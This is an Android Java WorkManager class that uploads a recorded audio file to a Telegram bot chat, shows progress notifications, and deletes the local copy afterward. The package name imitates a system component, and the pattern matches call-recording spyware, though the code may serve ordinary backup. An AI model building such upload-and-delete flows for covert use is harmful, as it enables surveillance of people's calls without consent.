package s28.system.phone.beta;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramUploadWorker extends Worker {
    private static final String TAG = "TelegramUploadWorker";
    private static final String CHANNEL_ID = "TelegramBackupChannel";
    private static final int NOTIFICATION_ID = 2802;

    public static final String KEY_FILE_PATH = "file_path";
    public static final String KEY_PHONE_NUMBER = "phone_number";
    public static final String KEY_TOKEN = "token";
    public static final String KEY_CHAT_ID = "chat_id";
    public static final String KEY_CAPTION = "caption";

    private final NotificationManager notificationManager;

    public TelegramUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        createNotificationChannel();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Telegram Backup Progress",
                    NotificationManager.IMPORTANCE_LOW
            );
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }

    @NonNull
    @Override
    public Result doWork() {
        String filePath = getInputData().getString(KEY_FILE_PATH);
        String phoneNumber = getInputData().getString(KEY_PHONE_NUMBER);
        String token = getInputData().getString(KEY_TOKEN);
        String chatId = getInputData().getString(KEY_CHAT_ID);
        String caption = getInputData().getString(KEY_CAPTION);

        if (filePath == null || token == null || chatId == null) {
            Log.e(TAG, "Missing required parameters for upload");
            return Result.failure();
        }

        File file = new File(filePath);
        if (!file.exists()) {
            Log.e(TAG, "File does not exist: " + filePath);
            return Result.failure();
        }

        if (!hasRealInternetAccess()) {
            Log.w(TAG, "No real internet access. Retrying later.");
            return Result.retry();
        }

        try {
            uploadToTelegram(file, token, chatId, caption);
            
            // Delete file after successful upload
            if (file.delete()) {
                Log.i(TAG, "Deleted file after successful upload: " + filePath);
            } else {
                Log.w(TAG, "Failed to delete file after upload: " + filePath);
            }
            
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Upload failed", e);
            if (getRunAttemptCount() < 10) {
                return Result.retry();
            } else {
                return Result.failure();
            }
        }
    }

    private boolean hasRealInternetAccess() {
        try {
            HttpURLConnection urlc = (HttpURLConnection) (new URL("https://api.telegram.org").openConnection());
            urlc.setRequestProperty("User-Agent", "Test");
            urlc.setRequestProperty("Connection", "close");
            urlc.setConnectTimeout(5000);
            urlc.connect();
            return (urlc.getResponseCode() == 200 || urlc.getResponseCode() == 302);
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet connection", e);
            return false;
        }
    }

    private void uploadToTelegram(File file, String token, String chatId, String caption) throws Exception {
        String fileName = file.getName();
        long fileSize = file.length();

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setContentTitle("Backing up recording")
                .setContentText(fileName)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setProgress(100, 0, false);

        notificationManager.notify(NOTIFICATION_ID, notificationBuilder.build());

        String urlString = "https://api.telegram.org/bot" + token + "/sendAudio";
        String boundary = "Boundary-" + System.currentTimeMillis();
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(60000);
        conn.setReadTimeout(60000);
        conn.setDoInput(true);
        conn.setDoOutput(true);
        conn.setUseCaches(false);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Connection", "Keep-Alive");
        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

        try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
            // Chat ID
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            dos.writeBytes(chatId + lineEnd);

            // Caption
            if (caption != null) {
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd + lineEnd);
                dos.write(caption.getBytes(StandardCharsets.UTF_8));
                dos.writeBytes(lineEnd);
            }

            // Audio file
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + fileName + "\"" + lineEnd);
            dos.writeBytes("Content-Type: audio/mp4" + lineEnd + lineEnd);

            try (FileInputStream fileInputStream = new FileInputStream(file)) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                long totalBytesRead = 0;
                int lastProgress = 0;

                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                    totalBytesRead += bytesRead;

                    int progress = (int) ((totalBytesRead * 100) / fileSize);
                    if (progress > lastProgress) {
                        notificationBuilder.setProgress(100, progress, false);
                        notificationBuilder.setContentText("Uploading: " + progress + "%");
                        notificationManager.notify(NOTIFICATION_ID, notificationBuilder.build());
                        lastProgress = progress;
                    }
                }
            }

            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
        }

        int serverResponseCode = conn.getResponseCode();
        if (serverResponseCode == 200) {
            notificationBuilder.setContentTitle("Backup Complete")
                    .setContentText("Recording uploaded to Telegram")
                    .setProgress(0, 0, false)
                    .setOngoing(false)
                    .setSmallIcon(android.R.drawable.stat_sys_upload_done)
                    .setAutoCancel(true);
            notificationManager.notify(NOTIFICATION_ID, notificationBuilder.build());
        } else {
            String errorResponse = readStream(conn.getErrorStream());
            Log.e(TAG, "Telegram upload failed with code " + serverResponseCode + ": " + errorResponse);
            notificationManager.cancel(NOTIFICATION_ID);
            throw new Exception("Upload failed with code " + serverResponseCode);
        }
    }

    private String readStream(InputStream is) {
        if (is == null) return "No error stream";
        try (BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
            return sb.toString();
        } catch (Exception e) {
            return "Error reading stream: " + e.getMessage();
        }
    }
}
